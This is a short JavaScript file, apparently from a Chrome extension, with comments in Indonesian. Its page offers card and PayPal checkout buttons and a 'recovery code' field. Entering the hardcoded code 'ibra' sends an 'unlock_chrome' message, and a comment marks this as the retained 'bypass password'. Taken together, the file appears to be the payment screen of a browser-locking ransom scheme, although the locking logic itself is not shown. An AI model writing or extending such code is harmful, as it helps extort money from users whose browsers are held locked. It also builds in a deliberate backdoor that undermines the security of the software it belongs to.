document.addEventListener('DOMContentLoaded', () => {
  const btnCard = document.getElementById('btn-card');
  const btnPaypal = document.getElementById('btn-paypal');
  const btnUnlock = document.getElementById('btn-unlock');
  const inputCode = document.getElementById('recovery-code');

  // Arahkan ke halaman checkout sesuai metode
  btnCard.addEventListener('click', () => {
    window.location.href = 'checkout.html?method=card';
  });
  
  btnPaypal.addEventListener('click', () => {
    window.location.href = 'checkout.html?method=paypal';
  });

  // LOGIKA BYPASS PASSWORD (IBRA) TETAP ADA DI SINI
  const processUnlock = () => {
    const code = inputCode.value;
    if (code === 'ibra') {
      chrome.runtime.sendMessage({ action: 'unlock_chrome' });
    } else {
      alert("Invalid Recovery Code!");
      inputCode.value = '';
    }
  };

  btnUnlock.addEventListener('click', processUnlock);
  
  inputCode.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      processUnlock();
    }
  });
});